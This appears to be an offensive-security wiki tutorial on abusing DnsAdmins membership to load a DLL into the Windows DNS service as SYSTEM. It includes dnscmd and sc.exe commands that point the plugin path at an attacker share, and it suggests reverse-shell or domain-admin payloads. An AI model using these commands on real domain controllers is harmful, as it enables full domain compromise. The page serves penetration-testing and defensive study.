---
title: "DnsAdmins: a DLL loaded into the DNS service as SYSTEM"
description: "Abusing membership of the DnsAdmins group to load an arbitrary DLL into the Windows DNS service, which runs as SYSTEM on the domain controller, by setting ServerLevelPluginDll and restarting the service."
keywords:
  - DnsAdmins
  - ServerLevelPluginDll
  - dnscmd
  - DNS service
  - privilege escalation
---

# DnsAdmins

Members of **DnsAdmins** manage the DNS server, and the Microsoft DNS service exposes a **server-level plugin DLL** feature: a path in `ServerLevelPluginDll` that the service loads at startup. The service (`dns.exe`) runs as **SYSTEM** on the domain controller, and the path is loaded **without validation**. So a DnsAdmins member points it at a malicious DLL on a share, restarts the service, and gets SYSTEM code execution on the DC, which is domain compromise.

## The attack

```bash
# Set the plugin DLL to an attacker share (dnscmd, from a member of DnsAdmins)
dnscmd <dc> /config /serverlevelplugindll \\attacker\share\evil.dll

# Or write the attribute over LDAP (no dnscmd needed), then restart DNS
# the value lands at HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll

# Restart the DNS service to load the DLL as SYSTEM
sc.exe \\<dc> stop dns && sc.exe \\<dc> start dns
```

The DLL only needs to export **`DnsPluginInitialize`** (and the other plugin entry points); your payload runs from there as SYSTEM. A common payload adds a domain admin or runs a reverse shell, after which you clean the `ServerLevelPluginDll` value and restart DNS to restore service.

## Exploitation notes

- The gate is the **DNS service restart**: DnsAdmins can usually restart it; if not, a reboot or another restart path (Server Operators) is needed. Pair accordingly.
- An invalid or crashing DLL breaks DNS for the domain, which is disruptive and noisy, so test the DLL and restore the config promptly.
- This is a classic "almost-DA" group to hunt for in [ACL enumeration](acl-enumeration.md) / BloodHound; DnsAdmins is frequently handed out to helpdesk or server teams.
- The same `serverLevelPluginDll` write is reachable through any [DACL edge](index.md) that lets you modify the DNS server object, not only group membership.

## Tools

- **dnscmd**: native, sets `ServerLevelPluginDll`.
- **Impacket / PowerView**: write the attribute over LDAP, and manage the service restart remotely.
- **NetExec / sc.exe**: restart the DNS service on the DC.

## References

- [ired.team: from DnsAdmins to SYSTEM to domain compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
- [Semperis: DnsAdmins revisited](https://www.semperis.com/blog/dnsadmins-revisited/)
- [HackTricks: privileged groups and token privileges](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
